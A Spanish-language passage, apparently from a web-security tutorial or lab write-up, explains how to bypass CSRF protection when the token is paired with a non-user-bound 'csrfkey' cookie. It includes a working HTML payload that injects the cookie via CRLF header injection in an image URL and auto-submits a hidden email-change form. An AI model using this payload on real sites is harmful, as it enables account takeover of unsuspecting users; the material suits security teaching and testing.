
En este caso hay una cookie que para este ejemplo la vamos a llamar csrfkey, esto suele ser bastante común, consiste en que tanto el csrf como esta cookie (csrfkey) son valores aleatorios, pero no están ligados a un usuario concreto, únicamente el csrf token está ligado a a esta cookie especial, es decir, son parejas aleatorias de valores y en backend se confirma si existen y si hacen parte de la misma pareja, para explotar esto la practica seria igual que antes, necesitamos interceptar una cookie csrfkey y su respectivo valor csrf, sin terminar de enviar esos valores usar el siguiente exploit:

```html
<form method="POST" action="{PAGINA_VICTIMA}">
	<input type="hidden" name="csrf" value="{CSRF_TOKEN}">
	<input type="hidden" name="email" value="{NUEVO EMAIL}" >

</form>

<img src="http://{PAGINA_VICTIMA}/?search=test%0d%0aSet-Cookie:%20csrfKey={CSRFKEY_COOKIE}%3b%20SameSite=None" onerror="document.forms[0].submit()">
```

Hay que tener en cuenta que para explotar esta vulnerabilidad es necesario que en alguna parte del sitio, en los headers del response se reflejen los datos que insertamos en alguna parte de la URL.

De esta forma se están inyectando dos cookies, la primera es la csrfKey, la segunda es la SameSite, en la cual nos adentraremos después, como esto no es una imagen, se va a ejecutar la porción de código que envía el formulario 